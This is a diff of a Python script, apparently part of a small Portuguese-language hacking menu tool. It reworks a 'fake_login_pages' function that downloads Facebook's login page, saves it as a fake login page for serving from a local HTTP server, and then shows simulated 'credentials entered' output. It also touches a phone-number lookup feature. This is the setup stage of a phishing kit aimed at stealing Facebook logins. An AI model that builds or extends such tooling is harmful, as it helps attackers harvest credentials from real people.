@@ -3,9 +3,16 @@ import subprocess
 import requests
 import time
 import threading
+import http.server
+import socketserver
 import numlookupapi
-import numbers
 from colorama import init, Fore, Style
+
+# Porta para o servidor HTTP local
+PORT = 8000
+
+# Diretório onde os arquivos HTML e CSS serão armazenados
+HTML_CSS_DIR = 'html_css'
 
 # Função para limpar a tela do console
 def clear_console():
@@ -236,30 +243,28 @@ def fake_login_pages(language):
     else:
         print("Clonando Facebook para login falso...")
 
-    # URL da página alvo para clonagem (exemplo com Facebook)
-    target_url = 'https://facebook.com/login.php'
+    # URL da página alvo para clonagem
+    target_url = "https://facebook.com/login.php"
 
-    # Download do HTML e CSS da página alvo
     try:
+        # Baixar HTML e CSS da página alvo
         response = requests.get(target_url)
         if response.status_code == 200:
             html_content = response.text
-
-            # Salvar HTML em um arquivo local
-            with open('fake_login_page.html', 'w', encoding='utf-8') as f:
+            # Salvar HTML localmente
+            with open(os.path.join(HTML_CSS_DIR, 'fake_login_page.html'), 'w', encoding='utf-8') as f:
                 f.write(html_content)
-
-            # Enviar resposta com sucesso
             print("Página clonada com sucesso!")
-        else:
-            print(f"Erro ao baixar página: {response.status_code}")
-            return
-    except Exception as e:
-        print(f"Erro ao clonar página: {e}")
-        return
 
-    # Exibir mensagem simulada de credenciais digitadas em um novo terminal
-    open_new_terminal(language)
+            # Exibir mensagem simulada de credenciais digitadas em um novo terminal
+            open_new_terminal(language)
+
+            input("\nPressione Enter para continuar...")
+        else:
+            print(Fore.RED + "Erro ao clonar página: HTTP status code", response.status_code)
+
+    except Exception as e:
+        print(Fore.RED + f"Erro ao clonar página: {e}")
 
     input("\nPressione Enter para continuar...")
 
@@ -270,7 +275,7 @@ def open_new_terminal(language):
         print("Credentials entered here...")
         time.sleep(3)
     except Exception as e:
-        print(f"Error opening new terminal: {e}")
+        print(Fore.RED + f"Error opening new terminal: {e}")
 
 # Função para informações de número de telefone
 def phone_number_info(language):
